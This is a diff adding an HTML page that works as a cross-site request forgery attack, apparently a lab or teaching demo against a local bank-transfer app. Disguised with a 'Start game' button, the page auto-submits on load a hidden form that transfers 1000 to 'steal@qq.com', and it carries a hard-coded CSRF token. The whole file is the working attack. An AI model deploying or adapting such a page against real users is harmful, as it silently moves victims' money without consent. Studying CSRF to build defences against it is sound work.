@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+</head>
+<body>
+
+    <form action="http://icbc.com:5000/transfer/" method="post" id="my_form">
+        <input type="hidden" name="csrf_token" value="ImVlYTQyNjAwNWJkZGYwODU1YTU0N2NiZDAyM2ViZTkzMDBhYmZmZmUi.EEEvtg.9Xb0MNhQb2UxJFgzNBuOFmd3uTg">
+        <table>
+            <tbody>
+            <tr>
+                <td></td>
+                <td><input type="hidden" name="email" value="steal@qq.com"></td>
+            </tr>
+            <tr>
+                <td></td>
+                <td><input type="hidden" name="amount" value="1000"></td>
+            </tr>
+            <tr>
+                <td></td>
+                <td><input type="submit" value="开始游戏"></td>
+            </tr>
+        </tbody>
+        </table>
+        <script>
+            $(function () {
+                $("#my_form").submit();
+            })
+        </script>
+    </form>
+</body>
+</html>
